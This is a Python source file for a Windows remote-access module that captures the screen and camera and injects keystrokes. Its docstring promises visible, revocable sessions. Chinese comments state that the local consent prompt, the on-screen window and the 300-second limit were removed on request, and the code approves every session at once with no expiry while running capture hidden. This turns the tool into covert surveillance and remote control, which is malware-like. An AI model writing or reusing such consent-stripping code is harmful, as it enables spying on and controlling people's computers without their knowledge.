"""Visible, revocable sessions for remote screen/camera access and keyboard input."""

import base64
import ctypes
import json
import os
import secrets
import subprocess
import threading
import time


SCOPES = {"screen": "屏幕共享", "camera": "摄像头共享", "input": "远程键盘"}


class ConsentSession:
    """无确认会话。

    原版会在本机弹一个可见窗口等人点“允许”，并带 300 秒时长上限。
    按需求这里全部去掉：
      * 不做任何确认，会话一创建就是已授权状态
      * 不设时长上限（duration=None 表示永不过期）
      * 不弹任何窗口
    仍然保留会话对象，因为上层要用 sid 管理“当前有哪些共享在跑”。
    """

    def __init__(self, scope, peer, duration=None):
        self.sid = secrets.token_urlsafe(24)
        self.scope = scope
        self.peer = peer
        self.duration = duration       # None = 不限制
        self.stopped = threading.Event()
        self.created = time.monotonic()
        self.last_active = time.monotonic()
        self.client_id = ""

    def alive(self):
        return not self.stopped.is_set()

    def close(self):
        self.stopped.set()


class WindowsBackend:
    message_slots = threading.BoundedSemaphore(3)
    def __init__(self, capture_exe):
        self.capture_exe = capture_exe

    def request_consent(self, session):
        """不再征求本机同意，直接放行，也不启动任何可见窗口。"""
        return True

    def capture(self, scope, device=0):
        if not os.path.isfile(self.capture_exe):
            raise RuntimeError("缺少 LanCmdCapture.exe，请完整更新 Windows 1.5.0 压缩包")
        args = [self.capture_exe, "screen"] if scope == "screen" else [self.capture_exe, "camera", str(device)]
        r = subprocess.run(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.DEVNULL, timeout=12, creationflags=0x08000000)
        if r.returncode or not r.stdout.startswith(b"\xff\xd8"):
            raise RuntimeError(r.stderr.decode("utf-8", "replace").strip() or "画面获取失败")
        if len(r.stdout) > 4 * 1024 * 1024:
            raise RuntimeError("画面过大")
        return r.stdout

    def cameras(self):
        r = subprocess.run([self.capture_exe, "list"], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                           stdin=subprocess.DEVNULL, timeout=10, creationflags=0x08000000)
        if r.returncode:
            raise RuntimeError(r.stderr.decode("utf-8", "replace").strip() or "读取摄像头失败")
        return json.loads(r.stdout.decode("utf-8"))

    def keys(self, keys, text, allowed=lambda: True):
        from ctypes import wintypes as w
        class Keyboard(ctypes.Structure):
            _fields_ = [("vk", w.WORD), ("scan", w.WORD), ("flags", w.DWORD),
                        ("time", w.DWORD), ("extra", ctypes.c_size_t)]
        class Mouse(ctypes.Structure):
            _fields_ = [("dx", w.LONG), ("dy", w.LONG), ("data", w.DWORD),
                        ("flags", w.DWORD), ("time", w.DWORD), ("extra", ctypes.c_size_t)]
        class Payload(ctypes.Union):
            _fields_ = [("keyboard", Keyboard), ("mouse", Mouse)]
        class Input(ctypes.Structure):
            _fields_ = [("type", w.DWORD), ("payload", Payload)]
        user = ctypes.WinDLL("user32", use_last_error=True)
        user.SendInput.argtypes = [w.UINT, ctypes.POINTER(Input), ctypes.c_int]
        def send(vk=0, scan=0, flags=0):
            item = Input(1, Payload(keyboard=Keyboard(vk, scan, flags, 0, 0)))
            if user.SendInput(1, ctypes.byref(item), ctypes.sizeof(Input)) != 1:
                raise RuntimeError("系统拒绝输入；请确认电脑已解锁且目标窗口权限不高于接收端")
        if text:
            raw = text.encode("utf-16-le")
            for i in range(0, len(raw), 2):
                if not allowed():
                    raise RuntimeError("本机已停止键盘控制")
                unit = int.from_bytes(raw[i:i + 2], "little")
                send(scan=unit, flags=4)
                send(scan=unit, flags=6)
        else:
            pressed = []
            try:
                for name in keys:
                    if not allowed():
                        raise RuntimeError("本机已停止键盘控制")
                    vk = KEY_CODES[name]
                    send(vk, flags=1 if vk in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2E, 0x5B) else 0)
                    pressed.append(vk)
            finally:
                for vk in reversed(pressed):
                    send(vk, flags=3 if vk in (0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x2E, 0x5B) else 2)

    def message(self, title, text):
        if not self.message_slots.acquire(blocking=False):
            return False
        def display():
            try:
                ctypes.windll.user32.MessageBoxW(None, text, "LanCmd · " + title, 0x40 | 0x10000)
            finally:
                self.message_slots.release()
        threading.Thread(target=display, name="lancmd-message", daemon=True).start()
        return True


KEY_CODES = {"CTRL": 0x11, "ALT": 0x12, "SHIFT": 0x10, "WIN": 0x5B,
             "ENTER": 0x0D, "ESC": 0x1B, "TAB": 9, "SPACE": 0x20, "BACKSPACE": 8,
             "DELETE": 0x2E, "HOME": 0x24, "END": 0x23, "PAGEUP": 0x21, "PAGEDOWN": 0x22,
             "LEFT": 0x25, "UP": 0x26, "RIGHT": 0x27, "DOWN": 0x28}
KEY_CODES.update({c: ord(c) for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"})
KEY_CODES.update({"F%d" % n: 0x6F + n for n in range(1, 13)})


class RemoteFeatures:
    def __init__(self, error, logger, capture_exe, backend=None):
        self.error = error
        self.log = logger
        self.backend = backend or WindowsBackend(capture_exe)
        self.supported = os.name == "nt" or backend is not None
        self.pending_consents = threading.BoundedSemaphore(3)

    def _check(self, state):
        if not self.supported:
            raise self.error("此功能仅支持 Windows 1.5.0 接收端")
        if not hasattr(state, "remote_sessions"):
            state.remote_sessions = {}

    def session(self, q, state):
        self._check(state)
        action = q.get("action", "begin")
        if action == "keepalive":
            session = state.remote_sessions.get(str(q.get("sid", "")))
            if not session:
                raise self.error("共享已结束", 403)
            self.active(q, state, session.scope)
            return {"active": True}
        if action == "end":
            session = state.remote_sessions.pop(str(q.get("sid", "")), None)
            if session:
                session.close()
            return {"stopped": True}
        if action != "begin" or q.get("scope") not in SCOPES:
            raise self.error("无效的共享请求")
        for sid, session in list(state.remote_sessions.items()):
            if not session.alive():
                session.close()
                state.remote_sessions.pop(sid, None)
        scope = q["scope"]
        # 不再询问本机，也不再限制同时进行的共享数量
        session = ConsentSession(scope, "%s · %s" % (state.peer, state.client_id[-8:]))
        session.client_id = state.client_id
        session.approved_at = time.time()
        state.remote_sessions[session.sid] = session
        self.log.info("开始共享 %s peer=%s client=%s", scope, state.peer, state.client_id)
        return {"sid": session.sid, "scope": scope, "expires_in": None}

    def active(self, q, state, scope):
        self._check(state)
        session = state.remote_sessions.get(str(q.get("sid", "")))
        if not session or session.scope != scope or session.client_id != state.client_id or not session.alive():
            raise self.error("共享已停止，请重新开始", 403)
        session.last_active = time.monotonic()
        return session

    def frame(self, q, state, scope):
        self.active(q, state, scope)
        action = q.get("action", "frame")
        if scope == "camera" and action == "list":
            devices = self.backend.cameras()
            self.active(q, state, scope)
            return {"devices": devices}
        if action != "frame":
            raise self.error("无效的画面操作")
        try:
            device = int(q.get("device", 0))
        except (TypeError, ValueError):
            raise self.error("摄像头编号无效")
        if device < 0 or device > 31:
            raise self.error("摄像头编号无效")
        raw = self.backend.capture(scope, device)
        # A local stop or expiry while capture was in flight discards the frame.
        self.active(q, state, scope)
        return {"format": "jpeg", "data": base64.b64encode(raw).decode("ascii")}

    def keyboard(self, q, state):
        session = self.active(q, state, "input")
        text = q.get("text", "")
        keys = q.get("keys", [])
        if not isinstance(text, str) or len(text) > 1000 or "\x00" in text:
            raise self.error("文字最多 1000 字")
        if not isinstance(keys, list) or not 0 <= len(keys) <= 5 or any(not isinstance(k, str) for k in keys):
            raise self.error("按键组合最多 5 个")
        keys = [k.upper() for k in keys]
        if bool(text) == bool(keys) or any(k not in KEY_CODES for k in keys) or len(set(keys)) != len(keys):
            raise self.error("请发送文字或有效按键组合")
        self.backend.keys(keys, text, allowed=session.alive)
        return {"sent": True}

    def message(self, q, state):
        self._check(state)
        text = q.get("text", "")
        title = q.get("title", "手机消息")
        if not isinstance(text, str) or not text.strip() or len(text) > 2000 or "\x00" in text:
            raise self.error("消息需为 1–2000 字")
        if not isinstance(title, str) or len(title) > 60 or "\x00" in title:
            raise self.error("标题最多 60 字")
        self.backend.message(title, text)
        return {"sent": True}

    def close(self, state):
        for session in getattr(state, "remote_sessions", {}).values():
            session.close()
        getattr(state, "remote_sessions", {}).clear()
